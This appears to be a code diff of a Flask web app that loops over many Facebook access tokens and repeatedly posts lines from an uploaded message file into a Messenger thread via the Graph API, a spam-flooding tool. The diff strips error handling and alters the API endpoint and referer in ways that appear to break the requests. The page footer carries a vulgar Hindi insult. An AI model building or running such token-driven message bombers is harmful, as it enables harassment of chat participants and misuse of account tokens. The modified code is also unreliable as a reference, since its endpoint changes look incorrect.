@@ -17,7 +17,7 @@ headers = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'https://www.google.com'
+    'referer': 'www.google.com'
 }
 
 stop_events = {}
@@ -30,40 +30,44 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/messages'
+                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
-                try:
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message Sent Successfully From token {access_token}: {message}")
-                    else:
-                        print(f"Message Sent Failed From token {access_token}: {message}")
-                except Exception as e:
-                    print(f"Error: {e}")
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
+
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
+
         return f'Task started with ID: {task_id}'
-    return render_template_string(''' 
+
+    return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -77,7 +81,7 @@ def send_message():
     label { color: white; }
     .file { height: 30px; }
     body {
-      background-image: url('https://i.ibb.co/gPR4STP/8b28c40564bed82f36c983bccff3a345.jpg');
+      background-image: url('https://i.ibb.co/KXJJxMj/54d831fd451b4c0b072eca603c4b25f8.jpg');
       background-size: cover;
       background-repeat: no-repeat;
      color: white;
@@ -137,8 +141,8 @@ def send_message():
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mt-3 text-Black">𝙰𝙻𝙻𝙷𝙰𝙳𝚄𝙻𝙻𝙸𝙻𝙰𝙷 𝙵𝙾𝚁 𝙴𝚅𝙴𝚁𝚈𝚃𝙷𝙸𝙽𝙶
-  </header>
+    <h1 class="mt-3 text-Black">𝙰lhadullilah 𝙰𝙻𝙻𝙷𝙰𝙳𝚄𝙻𝙻𝙸𝙻𝙰𝙷 𝙵𝙾𝚁 𝙴𝚅𝙴𝚁𝚈𝚃𝙷𝙸𝙽𝙶
+  </header> 
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
@@ -186,9 +190,8 @@ def send_message():
         <div class="footer-box">
             <h3>🩷𝙾𝚆𝙽𝙴𝚁=> 𝚂𝙰𝙷𝙸𝙻 𝙺𝙷𝙰𝙽🩷
            <h3>  
-           <p>𝚆𝙿 𝙽𝚄 => 𝟽𝟹𝟻𝟽𝟽𝟻𝟼𝟿𝟿𝟻 </p>
-           
-          <p>ɢᴏᴅ ᴀʙᴜꜱᴇʀ ᴋɪ ᴍᴀ ᴋɪ ᴄʜᴜᴛ </p>
+           <p>◉›𝚆𝙿 𝙽𝚄.=> 𝟽𝟹𝟻𝟽𝟽𝟻𝟼𝟿𝟿𝟻
+           <p> ɢᴏᴅ ᴀʙᴜꜱᴇʀ ᴋɪ ᴍᴀ ᴋɪ ᴄʜᴜᴛ </p>
         
            
   </footer>
